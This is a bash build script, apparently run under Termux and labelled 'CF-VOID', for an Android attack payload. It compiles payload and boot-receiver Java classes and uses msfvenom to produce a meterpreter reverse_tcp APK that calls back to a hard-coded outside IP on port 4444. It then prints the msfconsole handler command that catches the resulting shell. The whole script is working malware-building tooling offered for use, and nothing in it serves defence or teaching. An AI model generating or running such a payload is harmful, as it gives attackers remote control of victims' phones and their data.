#!/bin/bash
# CF-VOID Android Payload Build Script
# LHOST: 100.125.165.205 LPORT: 4444

# Method 1: Compile Java source
javac -d . MainActivity.java PayloadService.java BootReceiver.java

# Method 2: Use apktool for full APK reconstruction
# apktool b /data/data/com.termux/files/home/cfvoid/payloads/android_test -o payload.apk

# Method 3: Use msfvenom for full payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=100.125.165.205 LPORT=4444 -o payload.apk

echo '[+] Payload generated in /data/data/com.termux/files/home/cfvoid/payloads/android_test/'
echo '[+] Use: msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 100.125.165.205; set LPORT 4444; exploit"'
